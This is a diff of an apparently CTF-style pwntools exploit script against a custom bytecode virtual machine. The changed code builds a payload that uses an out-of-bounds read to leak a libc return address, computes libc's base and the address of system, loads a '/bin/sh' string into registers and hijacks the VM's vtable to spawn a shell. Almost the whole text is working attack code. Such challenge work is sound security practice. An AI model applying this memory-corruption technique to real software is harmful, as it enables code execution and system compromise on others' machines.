@@ -175,73 +175,77 @@ c
 # b *exec_vm+0x71
 """
 
+# $ pwn libcdb file ./libc.so.6
+__libc_start_main_ret = 0x24083
+
+bytecode = b""
+
+# jump to insn @ 0x400 to leak libc
+bytecode += VM_SET_R0(0x10, 0x400)
+
+# writing insn @ 0x83+0x4 = 0x87
+bytecode = bytecode.ljust((__libc_start_main_ret & 0xFF) + 4, b"\x00")
+for i in range(1, 6):
+    bytecode += VM_AND_R_R_IMM(i, i, 0xFF)
+
+# combine everything into one register r10
+bytecode += VM_XOR_R_R_R(0x10, 0x10, 0x10)
+for i in range(1, 6):
+    bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)
+    bytecode += VM_ADD_R_R_R(0x10, 0x10, 6 - i)
+bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)
+
+# set __libc_start_main_ret offset to r11
+bytecode += VM_SET_R_16(0x11, 0x4000)
+bytecode += VM_SET_R_32(0x11, 0x2)
+bytecode += VM_SUB_R_R_R(0x10, 0x10, 0x11)
+# now r10 = libc base address
+
+system = libc.sym["system"]
+
+bytecode += VM_XOR_R_R_R(0x15, 0x15, 0x15)
+# set system function offset to r15
+bytecode += VM_SET_R_16(0x15, system & 0xFFFF)
+bytecode += VM_SET_R_32(0x15, (system >> 16) & 0xFFFF)
+bytecode += VM_XOR_R_R_R(0x13, 0x13, 0x13)
+bytecode += VM_ADD_R_R_R(0x13, 0x10, 0x15)
+
+# set /bin/sh string to r14
+bytecode += VM_XOR_R_R_R(0x14, 0x14, 0x14)
+bytecode += VM_SET_R_16(0x14, u16(b"/b"))
+bytecode += VM_SET_R_32(0x14, u16(b"in"))
+bytecode += VM_SET_R_48(0x14, u16(b"/s"))
+bytecode += VM_SET_R_64(0x14, u16(b"h\x00"))
+
+# write 0x6f @ bytecode[0x4000]
+# write 0x6e @ bytecode[0x4001]
+bytecode += VM_XOR_R_R_R(0x11, 0x11, 0x11)
+bytecode += VM_SET_R_16(0x11, 0x4000)
+bytecode += VM_SET_R_16(0x12, 0x6F)
+bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x00)
+bytecode += VM_SET_R_16(0x12, 0x6E)
+bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x01)
+# shuffle vtable where vm->vtable[0] = vtable[0x6f] which contains
+# /bin/sh string address and vm->vtable[1] = vtable[0x6e] which contains
+# system function address
+bytecode += VM_SHUFFLE_VTABLES(0x2, 0x11, 0x00)
+
+# call system
+bytecode += VM_MOV_R_MEM(0, 0, 0)
+bytecode += VM_EXIT()
+
+bytecode = bytecode.ljust(0x400, b"\x00")
+for i in range(1, 256):
+    bytecode += VM_SET_R_16(i, i)
+# oob read @ bytecode[0x8010] == __libc_start_main_ret
+bytecode += VM_SET_R_16(0x10, 0x8010)
+# __libc_start_main_ret bytes goes into r0, r1, r2, r3, r4, r5, r6
+# r0 is now the least significant byte of __libc_start_main_ret
+# so after shuffle, we execute insn at LSB + 0x4
+bytecode += VM_SHUFFLE_REGS(6, 0x10, 0)
+
 
 with tempfile.NamedTemporaryFile("wb") as f:
-    bytecode = b""
-
-    # jump to insn @ 0x400 to leak libc
-    bytecode += VM_SET_R0(0x10, 0x400)
-
-    # writing insn @ 0x87
-    bytecode = bytecode.ljust(0x87, b"\x00")
-    for i in range(1, 6):
-        bytecode += VM_AND_R_R_IMM(i, i, 0xFF)
-
-    # combine everything into one register r10
-    bytecode += VM_XOR_R_R_R(0x10, 0x10, 0x10)
-    for i in range(1, 6):
-        bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)
-        bytecode += VM_ADD_R_R_R(0x10, 0x10, 6 - i)
-    bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)
-
-    # set __libc_start_main_ret offset to r11
-    bytecode += VM_SET_R_16(0x11, 0x4000)
-    bytecode += VM_SET_R_32(0x11, 0x2)
-    bytecode += VM_SUB_R_R_R(0x10, 0x10, 0x11)
-    # now r10 = libc base address
-
-    system = libc.sym["system"]
-
-    bytecode += VM_XOR_R_R_R(0x15, 0x15, 0x15)
-    # set system function offset to r15
-    bytecode += VM_SET_R_16(0x15, system & 0xFFFF)
-    bytecode += VM_SET_R_32(0x15, (system >> 16) & 0xFFFF)
-    bytecode += VM_XOR_R_R_R(0x13, 0x13, 0x13)
-    bytecode += VM_ADD_R_R_R(0x13, 0x10, 0x15)
-
-    # set /bin/sh string to r14
-    bytecode += VM_XOR_R_R_R(0x14, 0x14, 0x14)
-    bytecode += VM_SET_R_16(0x14, u16(b"/b"))
-    bytecode += VM_SET_R_32(0x14, u16(b"in"))
-    bytecode += VM_SET_R_48(0x14, u16(b"/s"))
-    bytecode += VM_SET_R_64(0x14, u16(b"h\x00"))
-
-    # write 0x6f @ bytecode[0x4000]
-    # write 0x6e @ bytecode[0x4001]
-    bytecode += VM_XOR_R_R_R(0x11, 0x11, 0x11)
-    bytecode += VM_SET_R_16(0x11, 0x4000)
-    bytecode += VM_SET_R_16(0x12, 0x6F)
-    bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x00)
-    bytecode += VM_SET_R_16(0x12, 0x6E)
-    bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x01)
-    # shuffle vtable where vm->vtable[0] = vtable[0x6f] which contains
-    # /bin/sh string address and vm->vtable[1] = vtable[0x6e] which contains
-    # system function address
-    bytecode += VM_SHUFFLE_VTABLES(0x2, 0x11, 0x00)
-
-    # call system
-    bytecode += VM_MOV_R_MEM(0, 0, 0)
-    bytecode += VM_EXIT()
-
-    bytecode = bytecode.ljust(0x400, b"\x00")
-    for i in range(1, 256):
-        bytecode += VM_SET_R_16(i, i)
-    # oob read @ bytecode[0x8010] == __libc_start_main_ret
-    bytecode += VM_SET_R_16(0x10, 0x8010)
-    # __libc_start_main_ret bytes goes into r0, r1, r2, r3, r4, r5, r6
-    # r0 is 0x83 so after shuffle, we execute insn at 0x87
-    bytecode += VM_SHUFFLE_REGS(6, 0x10, 0)
-
     f.write(bytecode)
     f.flush()
 
